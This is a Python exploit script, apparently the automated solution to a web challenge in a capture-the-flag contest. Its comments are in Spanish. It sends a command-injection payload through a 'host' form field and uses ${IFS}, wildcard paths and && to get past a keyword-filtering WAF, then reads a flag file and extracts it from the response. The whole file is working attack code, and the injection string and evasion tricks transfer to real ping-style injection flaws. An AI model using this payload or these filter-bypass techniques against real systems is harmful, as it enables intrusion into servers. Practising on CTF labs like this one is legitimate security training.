#!/usr/bin/env python3
"""
ChronosCTF 2026 - Exploit Script Automatizado
Reto: Comandos Ocultos (Web)
"""

import sys
import re
import urllib.request
import urllib.parse


def solve(target_url: str) -> bool:
    print(f"[*] Conectando con el objetivo: {target_url}")
    
    # Payload diseñado para evadir el WAF:
    # 1. No usa espacios (usa ${IFS})
    # 2. No usa 'cat' (usa /bin/c?t con ruta completa para expansión de wildcard)
    # 3. No usa 'flag' (usa /fl?g)
    # 4. No usa ';' (usa &&)
    payload = "127.0.0.1&&/bin/c?t${IFS}/fl?g"
    
    data = urllib.parse.urlencode({"host": payload}).encode("utf-8")
    req = urllib.request.Request(target_url, data=data, method="POST")
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode("utf-8")
            
            match = re.search(r"CHRONOS\{[^}]+\}", html)
            if match:
                flag = match.group(0)
                print(f"[+] ¡Éxito! Flag recuperada: {flag}")
                return True
            else:
                print("[-] No se encontró la bandera en la respuesta del servidor.")
                print(f"[*] Respuesta obtenida:\n{html[:500]}")
                return False
    except Exception as e:
        print(f"[-] Error durante la solicitud HTTP: {e}")
        return False


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5005"
    success = solve(url)
    sys.exit(0 if success else 1)
